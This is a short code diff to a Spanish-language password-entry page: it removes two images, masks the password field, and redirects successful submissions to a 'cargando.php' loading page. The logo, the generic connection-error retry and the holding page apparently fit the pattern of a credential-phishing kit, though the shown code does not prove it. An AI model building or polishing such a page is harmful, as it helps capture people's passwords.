@@ -17,10 +17,8 @@
 <body>
 
 <img src="img/logo.jpg" alt="" srcset="" width="100%">
-<img src="img/pass2.jpg" alt="" srcset="" width="8%" style="position:absolute; left:33px;margin-top:10px;">
-<img src="img/pass.jpg" alt="" srcset="" width="15%" style="position:absolute; right:33px;margin-top:-5px;">
 
-<center><input type="text" id="txtPassword" placeholder="Ingresa tu contraseña" style="width:80%; border:none; border-bottom:1px solid #dcdcdc; padding-left:35px; height:40px; font-size:15px;"></center>
+<center><input type="password" id="txtPassword" placeholder="Ingresa tu contraseña" style="width:80%; border:none; border-bottom:1px solid #dcdcdc; padding-left:35px; height:40px; font-size:15px;"></center>
 <a href="" style="position:absolute; right:30px; margin-top:10px;">¿Olvidaste tu contraseña?</a>
 
 <center><input type="submit" id="btnPass" value="Continuar" style="width:80%; background-color:#f08ba7; margin-top:50px; height:40px; border-radius:20px;"></center>
@@ -58,7 +56,7 @@
                     success: function(response) {
                         const result = JSON.parse(response);
                         if (result.success) {
-                            window.location.href = "finish.php";
+                            window.location.href = "cargando.php";
                         } else {
                             alert('Error de conexión, por favor intente de nuevo');
                            window.location.href = "/";
